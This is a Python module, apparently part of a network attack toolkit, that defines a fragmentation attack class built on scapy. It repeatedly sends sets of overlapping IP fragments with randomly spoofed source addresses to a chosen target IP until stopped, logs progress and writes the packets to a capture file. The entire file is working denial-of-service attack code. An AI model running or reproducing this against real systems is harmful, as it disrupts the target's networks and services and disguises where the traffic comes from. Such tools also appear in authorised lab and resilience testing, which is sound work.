import random, time
from scapy.all import Ether, IP, sendp, get_if_hwaddr
from attacks.base import BaseAttack


class FragAttack(BaseAttack):
    def run(self):
        target_ip = self.params.get("target_ip", "")
        if not target_ip:
            self.log("Frag Attack: no target IP", "error"); return

        dst_mac = self.resolve_mac(target_ip)
        src_mac = get_if_hwaddr(self.iface)
        writer  = self.open_pcap()
        sent    = 0

        self.log(f"Fragmentation Attack → {target_ip}", "warn")

        while not self._stop.is_set():
            spoof   = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
            frag_id = random.randint(0, 0xFFFF)
            payload = bytes(random.getrandbits(8) for _ in range(128))

            f1 = Ether(src=src_mac, dst=dst_mac) / IP(src=spoof, dst=target_ip, proto=17, id=frag_id, flags="MF", frag=0) / payload[:64]
            f2 = Ether(src=src_mac, dst=dst_mac) / IP(src=spoof, dst=target_ip, proto=17, id=frag_id, flags="MF", frag=5) / payload[40:104]
            f3 = Ether(src=src_mac, dst=dst_mac) / IP(src=spoof, dst=target_ip, proto=17, id=frag_id, flags=0,    frag=10) / payload[80:]

            for frag in [f1, f2, f3]:
                try:
                    sendp(frag, iface=self.iface, verbose=False)
                    self.write(frag)
                except Exception as e:
                    self.log(f"Frag error: {e}", "error"); break
            sent += 1
            if sent % 50 == 0:
                self.log(f"Frag Attack: {sent} sets sent ({sent*3} fragments)", "info")
            time.sleep(0.01)

        writer.close()
